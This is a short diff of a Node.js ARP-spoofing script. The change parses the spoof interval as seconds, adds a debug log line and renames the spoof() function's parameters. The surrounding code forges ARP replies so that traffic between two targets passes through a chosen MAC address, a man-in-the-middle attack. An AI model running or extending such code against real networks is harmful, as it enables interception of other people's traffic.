@@ -22,7 +22,8 @@ if(process.argv.length > 1) {
   target1 = process.argv[2];
   target2 = process.argv[3];
   if(typeof process.argv[4] !== "undefined") {
-    interval = process.argv[4];
+    interval = parseInt(process.argv[4]) * 1000;
+    console.log(interval);
   }
 }
 
@@ -61,7 +62,7 @@ var spoofBothWays = (target1, target2, mac) => {
   spoof(target2, target1, mac);
 };
 
-var spoof = (target1, target2, mac) => {
+var spoof = (srcIP, dstIP, mac) => {
 // Send reply from target1 to broadcast, advertising new hardware address
   var packet = createARPPacket();
 
@@ -73,8 +74,8 @@ var spoof = (target1, target2, mac) => {
   setMac(packet.arp.src_mac, mac);
   setMac(packet.eth.src_mac, mac);
 
-  setIP(packet.arp.src_ip, target1);
-  setIP(packet.arp.dst_ip, target2);
+  setIP(packet.arp.src_ip, srcIP);
+  setIP(packet.arp.dst_ip, dstIP);
 
   send(packet.buffer);
 };
